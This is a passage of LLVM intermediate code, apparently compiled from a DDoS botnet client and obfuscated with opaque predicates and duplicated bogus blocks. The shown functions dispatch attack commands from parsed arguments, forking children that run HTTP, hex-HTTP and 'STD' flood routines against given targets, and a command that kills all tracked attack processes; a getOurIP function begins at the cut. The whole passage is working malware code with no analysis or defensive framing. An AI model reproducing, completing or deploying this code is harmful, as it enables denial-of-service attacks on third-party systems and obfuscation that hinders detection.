originalBBpart276:                                ; preds = %originalBB74
  br label %1059

; <label>:692:                                    ; preds = %669
  %693 = call i32 @listFork()
  %694 = icmp ne i32 %693, 0
  br i1 %694, label %695, label %712

; <label>:695:                                    ; preds = %692
  %696 = load i32, i32* @x.97
  %697 = load i32, i32* @y.98
  %698 = sub i32 %696, 1
  %699 = mul i32 %696, %698
  %700 = urem i32 %699, 2
  %701 = icmp eq i32 %700, 0
  %702 = icmp slt i32 %697, 10
  %703 = or i1 %701, %702
  br i1 %703, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %695
  %704 = load i32, i32* @x.97
  %705 = load i32, i32* @y.98
  %706 = sub i32 %704, 1
  %707 = mul i32 %704, %706
  %708 = urem i32 %707, 2
  %709 = icmp eq i32 %708, 0
  %710 = icmp slt i32 %705, 10
  %711 = or i1 %709, %710
  br i1 %711, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %1059

; <label>:712:                                    ; preds = %692
  %713 = load i32, i32* @x.97
  %714 = load i32, i32* @y.98
  %715 = sub i32 %713, 1
  %716 = mul i32 %713, %715
  %717 = urem i32 %716, 2
  %718 = icmp eq i32 %717, 0
  %719 = icmp slt i32 %714, 10
  %720 = or i1 %718, %719
  br i1 %720, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %712
  %721 = load i8**, i8*** %12, align 8
  %722 = getelementptr inbounds i8*, i8** %721, i64 1
  %723 = load i8*, i8** %722, align 8
  %724 = load i8**, i8*** %12, align 8
  %725 = getelementptr inbounds i8*, i8** %724, i64 2
  %726 = load i8*, i8** %725, align 8
  %727 = load i8**, i8*** %12, align 8
  %728 = getelementptr inbounds i8*, i8** %727, i64 3
  %729 = load i8*, i8** %728, align 8
  %730 = call i32 @atoi(i8* %729) #9
  %731 = trunc i32 %730 to i16
  %732 = load i8**, i8*** %12, align 8
  %733 = getelementptr inbounds i8*, i8** %732, i64 4
  %734 = load i8*, i8** %733, align 8
  %735 = load i8**, i8*** %12, align 8
  %736 = getelementptr inbounds i8*, i8** %735, i64 5
  %737 = load i8*, i8** %736, align 8
  %738 = call i32 @atoi(i8* %737) #9
  %739 = load i8**, i8*** %12, align 8
  %740 = getelementptr inbounds i8*, i8** %739, i64 6
  %741 = load i8*, i8** %740, align 8
  %742 = call i32 @atoi(i8* %741) #9
  call void @SendHTTP(i8* %723, i8* %726, i16 zeroext %731, i8* %734, i32 %738, i32 %742)
  call void @exit(i32 0) #11
  %743 = load i32, i32* @x.97
  %744 = load i32, i32* @y.98
  %745 = sub i32 %743, 1
  %746 = mul i32 %743, %745
  %747 = urem i32 %746, 2
  %748 = icmp eq i32 %747, 0
  %749 = icmp slt i32 %744, 10
  %750 = or i1 %748, %749
  br i1 %750, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  unreachable

; <label>:751:                                    ; preds = %638
  %752 = load i32, i32* @x.97
  %753 = load i32, i32* @y.98
  %754 = sub i32 %752, 1
  %755 = mul i32 %752, %754
  %756 = urem i32 %755, 2
  %757 = icmp eq i32 %756, 0
  %758 = icmp slt i32 %753, 10
  %759 = or i1 %757, %758
  br i1 %759, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %751
  %760 = load i8**, i8*** %12, align 8
  %761 = getelementptr inbounds i8*, i8** %760, i64 0
  %762 = load i8*, i8** %761, align 8
  %763 = call i32 @strcmp(i8* %762, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.303, i32 0, i32 0)) #9
  %764 = icmp ne i32 %763, 0
  %765 = load i32, i32* @x.97
  %766 = load i32, i32* @y.98
  %767 = sub i32 %765, 1
  %768 = mul i32 %765, %767
  %769 = urem i32 %768, 2
  %770 = icmp eq i32 %769, 0
  %771 = icmp slt i32 %766, 10
  %772 = or i1 %770, %771
  br i1 %772, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %764, label %832, label %773

; <label>:773:                                    ; preds = %originalBBpart288
  %774 = load i32, i32* %11, align 4
  %775 = icmp slt i32 %774, 6
  br i1 %775, label %788, label %776

; <label>:776:                                    ; preds = %773
  %777 = load i8**, i8*** %12, align 8
  %778 = getelementptr inbounds i8*, i8** %777, i64 3
  %779 = load i8*, i8** %778, align 8
  %780 = call i32 @atoi(i8* %779) #9
  %781 = icmp slt i32 %780, 1
  br i1 %781, label %788, label %782

; <label>:782:                                    ; preds = %776
  %783 = load i8**, i8*** %12, align 8
  %784 = getelementptr inbounds i8*, i8** %783, i64 5
  %785 = load i8*, i8** %784, align 8
  %786 = call i32 @atoi(i8* %785) #9
  %787 = icmp slt i32 %786, 1
  br i1 %787, label %788, label %805

; <label>:788:                                    ; preds = %782, %776, %773
  %789 = load i32, i32* @x.97
  %790 = load i32, i32* @y.98
  %791 = sub i32 %789, 1
  %792 = mul i32 %789, %791
  %793 = urem i32 %792, 2
  %794 = icmp eq i32 %793, 0
  %795 = icmp slt i32 %790, 10
  %796 = or i1 %794, %795
  br i1 %796, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %788
  %797 = load i32, i32* @x.97
  %798 = load i32, i32* @y.98
  %799 = sub i32 %797, 1
  %800 = mul i32 %797, %799
  %801 = urem i32 %800, 2
  %802 = icmp eq i32 %801, 0
  %803 = icmp slt i32 %798, 10
  %804 = or i1 %802, %803
  br i1 %804, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %1059

; <label>:805:                                    ; preds = %782
  %806 = call i32 @listFork()
  %807 = icmp ne i32 %806, 0
  br i1 %807, label %808, label %809

; <label>:808:                                    ; preds = %805
  br label %1059

; <label>:809:                                    ; preds = %805
  %810 = load i8**, i8*** %12, align 8
  %811 = getelementptr inbounds i8*, i8** %810, i64 1
  %812 = load i8*, i8** %811, align 8
  %813 = load i8**, i8*** %12, align 8
  %814 = getelementptr inbounds i8*, i8** %813, i64 2
  %815 = load i8*, i8** %814, align 8
  %816 = load i8**, i8*** %12, align 8
  %817 = getelementptr inbounds i8*, i8** %816, i64 3
  %818 = load i8*, i8** %817, align 8
  %819 = call i32 @atoi(i8* %818) #9
  %820 = trunc i32 %819 to i16
  %821 = load i8**, i8*** %12, align 8
  %822 = getelementptr inbounds i8*, i8** %821, i64 4
  %823 = load i8*, i8** %822, align 8
  %824 = load i8**, i8*** %12, align 8
  %825 = getelementptr inbounds i8*, i8** %824, i64 5
  %826 = load i8*, i8** %825, align 8
  %827 = call i32 @atoi(i8* %826) #9
  %828 = load i8**, i8*** %12, align 8
  %829 = getelementptr inbounds i8*, i8** %828, i64 6
  %830 = load i8*, i8** %829, align 8
  %831 = call i32 @atoi(i8* %830) #9
  call void @SendHTTPHex(i8* %812, i8* %815, i16 zeroext %820, i8* %823, i32 %827, i32 %831)
  call void @exit(i32 0) #11
  unreachable

; <label>:832:                                    ; preds = %originalBBpart288
  %833 = load i8**, i8*** %12, align 8
  %834 = getelementptr inbounds i8*, i8** %833, i64 0
  %835 = load i8*, i8** %834, align 8
  %836 = call i32 @strcmp(i8* %835, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.304, i32 0, i32 0)) #9
  %837 = icmp ne i32 %836, 0
  br i1 %837, label %958, label %838

; <label>:838:                                    ; preds = %832
  %839 = load i32, i32* @x.97
  %840 = load i32, i32* @y.98
  %841 = sub i32 %839, 1
  %842 = mul i32 %839, %841
  %843 = urem i32 %842, 2
  %844 = icmp eq i32 %843, 0
  %845 = icmp slt i32 %840, 10
  %846 = or i1 %844, %845
  br i1 %846, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %838
  %847 = load i32, i32* %11, align 4
  %848 = icmp slt i32 %847, 4
  %849 = load i32, i32* @x.97
  %850 = load i32, i32* @y.98
  %851 = sub i32 %849, 1
  %852 = mul i32 %849, %851
  %853 = urem i32 %852, 2
  %854 = icmp eq i32 %853, 0
  %855 = icmp slt i32 %850, 10
  %856 = or i1 %854, %855
  br i1 %856, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %848, label %869, label %857

; <label>:857:                                    ; preds = %originalBBpart296
  %858 = load i8**, i8*** %12, align 8
  %859 = getelementptr inbounds i8*, i8** %858, i64 2
  %860 = load i8*, i8** %859, align 8
  %861 = call i32 @atoi(i8* %860) #9
  %862 = icmp slt i32 %861, 1
  br i1 %862, label %869, label %863

; <label>:863:                                    ; preds = %857
  %864 = load i8**, i8*** %12, align 8
  %865 = getelementptr inbounds i8*, i8** %864, i64 3
  %866 = load i8*, i8** %865, align 8
  %867 = call i32 @atoi(i8* %866) #9
  %868 = icmp slt i32 %867, 1
  br i1 %868, label %869, label %870

; <label>:869:                                    ; preds = %863, %857, %originalBBpart296
  br label %1059

; <label>:870:                                    ; preds = %863
  %871 = load i8**, i8*** %12, align 8
  %872 = getelementptr inbounds i8*, i8** %871, i64 1
  %873 = load i8*, i8** %872, align 8
  store i8* %873, i8** %33, align 8
  %874 = load i8**, i8*** %12, align 8
  %875 = getelementptr inbounds i8*, i8** %874, i64 2
  %876 = load i8*, i8** %875, align 8
  %877 = call i32 @atoi(i8* %876) #9
  store i32 %877, i32* %34, align 4
  %878 = load i8**, i8*** %12, align 8
  %879 = getelementptr inbounds i8*, i8** %878, i64 3
  %880 = load i8*, i8** %879, align 8
  %881 = call i32 @atoi(i8* %880) #9
  store i32 %881, i32* %35, align 4
  %882 = load i8*, i8** %33, align 8
  %883 = call i8* @strstr(i8* %882, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0)) #9
  %884 = icmp ne i8* %883, null
  br i1 %884, label %885, label %933

; <label>:885:                                    ; preds = %870
  %886 = load i32, i32* @x.97
  %887 = load i32, i32* @y.98
  %888 = sub i32 %886, 1
  %889 = mul i32 %886, %888
  %890 = urem i32 %889, 2
  %891 = icmp eq i32 %890, 0
  %892 = icmp slt i32 %887, 10
  %893 = or i1 %891, %892
  br i1 %893, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %885
  %894 = load i8*, i8** %33, align 8
  %895 = call i8* @strtok(i8* %894, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0)) #3
  store i8* %895, i8** %36, align 8
  %896 = load i32, i32* @x.97
  %897 = load i32, i32* @y.98
  %898 = sub i32 %896, 1
  %899 = mul i32 %896, %898
  %900 = urem i32 %899, 2
  %901 = icmp eq i32 %900, 0
  %902 = icmp slt i32 %897, 10
  %903 = or i1 %901, %902
  br i1 %903, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %904

; <label>:904:                                    ; preds = %930, %originalBBpart2100
  %905 = load i8*, i8** %36, align 8
  %906 = icmp ne i8* %905, null
  br i1 %906, label %907, label %932

; <label>:907:                                    ; preds = %904
  %908 = load i32, i32* @x.97
  %909 = load i32, i32* @y.98
  %910 = sub i32 %908, 1
  %911 = mul i32 %908, %910
  %912 = urem i32 %911, 2
  %913 = icmp eq i32 %912, 0
  %914 = icmp slt i32 %909, 10
  %915 = or i1 %913, %914
  br i1 %915, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %907
  %916 = call i32 @listFork()
  %917 = icmp ne i32 %916, 0
  %918 = load i32, i32* @x.97
  %919 = load i32, i32* @y.98
  %920 = sub i32 %918, 1
  %921 = mul i32 %918, %920
  %922 = urem i32 %921, 2
  %923 = icmp eq i32 %922, 0
  %924 = icmp slt i32 %919, 10
  %925 = or i1 %923, %924
  br i1 %925, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %917, label %930, label %926

; <label>:926:                                    ; preds = %originalBBpart2104
  %927 = load i8*, i8** %36, align 8
  %928 = load i32, i32* %34, align 4
  %929 = load i32, i32* %35, align 4
  call void @sendSTD(i8* %927, i32 %928, i32 %929)
  call void @_exit(i32 0) #12
  unreachable

; <label>:930:                                    ; preds = %originalBBpart2104
  %931 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0)) #3
  store i8* %931, i8** %36, align 8
  br label %904

; <label>:932:                                    ; preds = %904
  br label %957

; <label>:933:                                    ; preds = %870
  %934 = call i32 @listFork()
  %935 = icmp ne i32 %934, 0
  br i1 %935, label %936, label %953

; <label>:936:                                    ; preds = %933
  %937 = load i32, i32* @x.97
  %938 = load i32, i32* @y.98
  %939 = sub i32 %937, 1
  %940 = mul i32 %937, %939
  %941 = urem i32 %940, 2
  %942 = icmp eq i32 %941, 0
  %943 = icmp slt i32 %938, 10
  %944 = or i1 %942, %943
  br i1 %944, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %936
  %945 = load i32, i32* @x.97
  %946 = load i32, i32* @y.98
  %947 = sub i32 %945, 1
  %948 = mul i32 %945, %947
  %949 = urem i32 %948, 2
  %950 = icmp eq i32 %949, 0
  %951 = icmp slt i32 %946, 10
  %952 = or i1 %950, %951
  br i1 %952, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br label %1059

; <label>:953:                                    ; preds = %933
  %954 = load i8*, i8** %33, align 8
  %955 = load i32, i32* %34, align 4
  %956 = load i32, i32* %35, align 4
  call void @sendSTD(i8* %954, i32 %955, i32 %956)
  call void @_exit(i32 0) #12
  unreachable

; <label>:957:                                    ; preds = %932
  br label %958

; <label>:958:                                    ; preds = %957, %832
  %959 = load i8**, i8*** %12, align 8
  %960 = getelementptr inbounds i8*, i8** %959, i64 0
  %961 = load i8*, i8** %960, align 8
  %962 = call i32 @strcmp(i8* %961, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.305, i32 0, i32 0)) #9
  %963 = icmp ne i32 %962, 0
  br i1 %963, label %1059, label %964

; <label>:964:                                    ; preds = %958
  store i32 0, i32* %37, align 4
  store i64 0, i64* %38, align 8
  br label %965

; <label>:965:                                    ; preds = %originalBBpart2129, %964
  %966 = load i64, i64* %38, align 8
  %967 = load i64, i64* @numpids, align 8
  %968 = icmp ult i64 %966, %967
  br i1 %968, label %969, label %1058

; <label>:969:                                    ; preds = %965
  %970 = load i32, i32* @x.97
  %971 = load i32, i32* @y.98
  %972 = sub i32 %970, 1
  %973 = mul i32 %970, %972
  %974 = urem i32 %973, 2
  %975 = icmp eq i32 %974, 0
  %976 = icmp slt i32 %971, 10
  %977 = or i1 %975, %976
  br i1 %977, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %969
  %978 = load i32*, i32** @pids, align 8
  %979 = load i64, i64* %38, align 8
  %980 = getelementptr inbounds i32, i32* %978, i64 %979
  %981 = load i32, i32* %980, align 4
  %982 = icmp ne i32 %981, 0
  %983 = load i32, i32* @x.97
  %984 = load i32, i32* @y.98
  %985 = sub i32 %983, 1
  %986 = mul i32 %983, %985
  %987 = urem i32 %986, 2
  %988 = icmp eq i32 %987, 0
  %989 = icmp slt i32 %984, 10
  %990 = or i1 %988, %989
  br i1 %990, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %982, label %991, label %1022

; <label>:991:                                    ; preds = %originalBBpart2112
  %992 = load i32, i32* @x.97
  %993 = load i32, i32* @y.98
  %994 = sub i32 %992, 1
  %995 = mul i32 %992, %994
  %996 = urem i32 %995, 2
  %997 = icmp eq i32 %996, 0
  %998 = icmp slt i32 %993, 10
  %999 = or i1 %997, %998
  br i1 %999, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %991
  %1000 = load i32*, i32** @pids, align 8
  %1001 = load i64, i64* %38, align 8
  %1002 = getelementptr inbounds i32, i32* %1000, i64 %1001
  %1003 = load i32, i32* %1002, align 4
  %1004 = call i32 @getpid() #3
  %1005 = icmp ne i32 %1003, %1004
  %1006 = load i32, i32* @x.97
  %1007 = load i32, i32* @y.98
  %1008 = sub i32 %1006, 1
  %1009 = mul i32 %1006, %1008
  %1010 = urem i32 %1009, 2
  %1011 = icmp eq i32 %1010, 0
  %1012 = icmp slt i32 %1007, 10
  %1013 = or i1 %1011, %1012
  br i1 %1013, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %1005, label %1014, label %1022

; <label>:1014:                                   ; preds = %originalBBpart2116
  %1015 = load i32*, i32** @pids, align 8
  %1016 = load i64, i64* %38, align 8
  %1017 = getelementptr inbounds i32, i32* %1015, i64 %1016
  %1018 = load i32, i32* %1017, align 4
  %1019 = call i32 @kill(i32 %1018, i32 9) #3
  %1020 = load i32, i32* %37, align 4
  %1021 = add nsw i32 %1020, 1
  store i32 %1021, i32* %37, align 4
  br label %1022

; <label>:1022:                                   ; preds = %1014, %originalBBpart2116, %originalBBpart2112
  %1023 = load i32, i32* @x.97
  %1024 = load i32, i32* @y.98
  %1025 = sub i32 %1023, 1
  %1026 = mul i32 %1023, %1025
  %1027 = urem i32 %1026, 2
  %1028 = icmp eq i32 %1027, 0
  %1029 = icmp slt i32 %1024, 10
  %1030 = or i1 %1028, %1029
  br i1 %1030, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %1022
  %1031 = load i32, i32* @x.97
  %1032 = load i32, i32* @y.98
  %1033 = sub i32 %1031, 1
  %1034 = mul i32 %1031, %1033
  %1035 = urem i32 %1034, 2
  %1036 = icmp eq i32 %1035, 0
  %1037 = icmp slt i32 %1032, 10
  %1038 = or i1 %1036, %1037
  br i1 %1038, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br label %1039

; <label>:1039:                                   ; preds = %originalBBpart2120
  %1040 = load i32, i32* @x.97
  %1041 = load i32, i32* @y.98
  %1042 = sub i32 %1040, 1
  %1043 = mul i32 %1040, %1042
  %1044 = urem i32 %1043, 2
  %1045 = icmp eq i32 %1044, 0
  %1046 = icmp slt i32 %1041, 10
  %1047 = or i1 %1045, %1046
  br i1 %1047, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %1039
  %1048 = load i64, i64* %38, align 8
  %1049 = add i64 %1048, 1
  store i64 %1049, i64* %38, align 8
  %1050 = load i32, i32* @x.97
  %1051 = load i32, i32* @y.98
  %1052 = sub i32 %1050, 1
  %1053 = mul i32 %1050, %1052
  %1054 = urem i32 %1053, 2
  %1055 = icmp eq i32 %1054, 0
  %1056 = icmp slt i32 %1051, 10
  %1057 = or i1 %1055, %1056
  br i1 %1057, label %originalBBpart2129, label %originalBB122alteredBB

originalBBpart2129:                               ; preds = %originalBB122
  br label %965

; <label>:1058:                                   ; preds = %965
  br label %1059

; <label>:1059:                                   ; preds = %1058, %958, %originalBBpart2108, %869, %808, %originalBBpart292, %originalBBpart280, %originalBBpart276, %466, %382, %246, %116, %originalBBpart28, %90, %77
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %1060 = alloca i32, align 4
  %1061 = alloca i8**, align 8
  %1062 = alloca i32, align 4
  %1063 = alloca i32, align 4
  %1064 = alloca i32, align 4
  %1065 = alloca i8*, align 8
  %1066 = alloca i32, align 4
  %1067 = alloca i32, align 4
  %1068 = alloca i32, align 4
  %1069 = alloca i32, align 4
  %1070 = alloca i32, align 4
  %1071 = alloca i32, align 4
  %1072 = alloca i32, align 4
  %1073 = alloca i8*, align 8
  %1074 = alloca i8*, align 8
  %1075 = alloca i32, align 4
  %1076 = alloca i32, align 4
  %1077 = alloca i32, align 4
  %1078 = alloca i8*, align 8
  %1079 = alloca i32, align 4
  %1080 = alloca i32, align 4
  %1081 = alloca i8*, align 8
  %1082 = alloca i8*, align 8
  %1083 = alloca i32, align 4
  %1084 = alloca i32, align 4
  %1085 = alloca i8*, align 8
  %1086 = alloca i32, align 4
  %1087 = alloca i64, align 8
  store i32 %0, i32* %1060, align 4
  store i8** %1, i8*** %1061, align 8
  %1088 = load i8**, i8*** %1061, align 8
  %1089 = getelementptr inbounds i8*, i8** %1088, i64 0
  %1090 = load i8*, i8** %1089, align 8
  %1091 = call i32 @strcmp(i8* %1090, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.297, i32 0, i32 0)) #9
  %1092 = icmp ne i32 %1091, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %58
  %1093 = load i32, i32* @botnetPid, align 4
  %1094 = icmp eq i32 %1093, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %95
  %1095 = load i32, i32* %13, align 4
  store i32 %1095, i32* @botnetPid, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %121
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %144
  %1096 = load i32, i32* %11, align 4
  %1097 = icmp slt i32 %1096, 6
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %169
  %1098 = load i8**, i8*** %12, align 8
  %1099 = getelementptr inbounds i8*, i8** %1098, i64 2
  %1100 = load i8*, i8** %1099, align 8
  %1101 = call i32 @atoi(i8* %1100) #9
  %1102 = icmp eq i32 %1101, -1
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %209
  %1103 = load i8**, i8*** %12, align 8
  %1104 = getelementptr inbounds i8*, i8** %1103, i64 5
  %1105 = load i8*, i8** %1104, align 8
  %1106 = call i32 @atoi(i8* %1105) #9
  %1107 = icmp sgt i32 %1106, 65500
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %279
  %1108 = load i8**, i8*** %12, align 8
  %1109 = getelementptr inbounds i8*, i8** %1108, i64 7
  %1110 = load i8*, i8** %1109, align 8
  %1111 = call i32 @atoi(i8* %1110) #9
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %300
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %321
  %1112 = load i8**, i8*** %12, align 8
  %1113 = getelementptr inbounds i8*, i8** %1112, i64 8
  %1114 = load i8*, i8** %1113, align 8
  %1115 = call i32 @atoi(i8* %1114) #9
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %398
  %1116 = load i8**, i8*** %12, align 8
  %1117 = getelementptr inbounds i8*, i8** %1116, i64 2
  %1118 = load i8*, i8** %1117, align 8
  %1119 = call i32 @atoi(i8* %1118) #9
  %1120 = icmp eq i32 %1119, -1
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %441
  %1121 = load i32, i32* %11, align 4
  %1122 = icmp eq i32 %1121, 8
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %467
  %1123 = load i8**, i8*** %12, align 8
  %1124 = getelementptr inbounds i8*, i8** %1123, i64 1
  %1125 = load i8*, i8** %1124, align 8
  store i8* %1125, i8** %25, align 8
  %1126 = load i8**, i8*** %12, align 8
  %1127 = getelementptr inbounds i8*, i8** %1126, i64 2
  %1128 = load i8*, i8** %1127, align 8
  %1129 = call i32 @atoi(i8* %1128) #9
  store i32 %1129, i32* %26, align 4
  %1130 = load i8**, i8*** %12, align 8
  %1131 = getelementptr inbounds i8*, i8** %1130, i64 3
  %1132 = load i8*, i8** %1131, align 8
  %1133 = call i32 @atoi(i8* %1132) #9
  store i32 %1133, i32* %27, align 4
  %1134 = load i8**, i8*** %12, align 8
  %1135 = getelementptr inbounds i8*, i8** %1134, i64 4
  %1136 = load i8*, i8** %1135, align 8
  %1137 = call i32 @atoi(i8* %1136) #9
  store i32 %1137, i32* %28, align 4
  %1138 = load i8**, i8*** %12, align 8
  %1139 = getelementptr inbounds i8*, i8** %1138, i64 5
  %1140 = load i8*, i8** %1139, align 8
  store i8* %1140, i8** %29, align 8
  %1141 = load i32, i32* %11, align 4
  %1142 = icmp eq i32 %1141, 8
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %510
  store i32 %511, i32* %30, align 4
  %1143 = load i32, i32* %11, align 4
  %1144 = icmp sgt i32 %1143, 6
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %530
  %1145 = load i8**, i8*** %12, align 8
  %1146 = getelementptr inbounds i8*, i8** %1145, i64 6
  %1147 = load i8*, i8** %1146, align 8
  %1148 = call i32 @atoi(i8* %1147) #9
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %576
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %593
  %1149 = call i32 @listFork()
  %1150 = icmp ne i32 %1149, 0
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %620
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %647
  %1151 = load i8**, i8*** %12, align 8
  %1152 = getelementptr inbounds i8*, i8** %1151, i64 3
  %1153 = load i8*, i8** %1152, align 8
  %1154 = call i32 @atoi(i8* %1153) #9
  %1155 = icmp slt i32 %1154, 1
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %675
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %695
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %712
  %1156 = load i8**, i8*** %12, align 8
  %1157 = getelementptr inbounds i8*, i8** %1156, i64 1
  %1158 = load i8*, i8** %1157, align 8
  %1159 = load i8**, i8*** %12, align 8
  %1160 = getelementptr inbounds i8*, i8** %1159, i64 2
  %1161 = load i8*, i8** %1160, align 8
  %1162 = load i8**, i8*** %12, align 8
  %1163 = getelementptr inbounds i8*, i8** %1162, i64 3
  %1164 = load i8*, i8** %1163, align 8
  %1165 = call i32 @atoi(i8* %1164) #9
  %1166 = trunc i32 %1165 to i16
  %1167 = load i8**, i8*** %12, align 8
  %1168 = getelementptr inbounds i8*, i8** %1167, i64 4
  %1169 = load i8*, i8** %1168, align 8
  %1170 = load i8**, i8*** %12, align 8
  %1171 = getelementptr inbounds i8*, i8** %1170, i64 5
  %1172 = load i8*, i8** %1171, align 8
  %1173 = call i32 @atoi(i8* %1172) #9
  %1174 = load i8**, i8*** %12, align 8
  %1175 = getelementptr inbounds i8*, i8** %1174, i64 6
  %1176 = load i8*, i8** %1175, align 8
  %1177 = call i32 @atoi(i8* %1176) #9
  call void @SendHTTP(i8* %1158, i8* %1161, i16 zeroext %1166, i8* %1169, i32 %1173, i32 %1177)
  call void @exit(i32 0) #11
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %751
  %1178 = load i8**, i8*** %12, align 8
  %1179 = getelementptr inbounds i8*, i8** %1178, i64 0
  %1180 = load i8*, i8** %1179, align 8
  %1181 = call i32 @strcmp(i8* %1180, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.303, i32 0, i32 0)) #9
  %1182 = icmp ne i32 %1181, 0
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %788
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %838
  %1183 = load i32, i32* %11, align 4
  %1184 = icmp slt i32 %1183, 4
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %885
  %1185 = load i8*, i8** %33, align 8
  %1186 = call i8* @strtok(i8* %1185, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0)) #3
  store i8* %1186, i8** %36, align 8
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %907
  %1187 = call i32 @listFork()
  %1188 = icmp ne i32 %1187, 0
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %936
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %969
  %1189 = load i32*, i32** @pids, align 8
  %1190 = load i64, i64* %38, align 8
  %1191 = getelementptr inbounds i32, i32* %1189, i64 %1190
  %1192 = load i32, i32* %1191, align 4
  %1193 = icmp ne i32 %1192, 0
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %991
  %1194 = load i32*, i32** @pids, align 8
  %1195 = load i64, i64* %38, align 8
  %1196 = getelementptr inbounds i32, i32* %1194, i64 %1195
  %1197 = load i32, i32* %1196, align 4
  %1198 = call i32 @getpid() #3
  %1199 = icmp ne i32 %1197, %1198
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %1022
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1039
  %1200 = load i64, i64* %38, align 8
  %_ = sub i64 0, %1200
  %gen = add i64 %_, 1
  %_123 = shl i64 %1200, 1
  %_124 = shl i64 %1200, 1
  %_125 = sub i64 %1200, 1
  %gen126 = mul i64 %_125, 1
  %_127 = shl i64 %1200, 1
  %1201 = add i64 %1200, 1
  store i64 %1201, i64* %38, align 8
  br label %originalBB122
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #5

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = load i32, i32* @x.99
  %2 = load i32, i32* @y.100
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
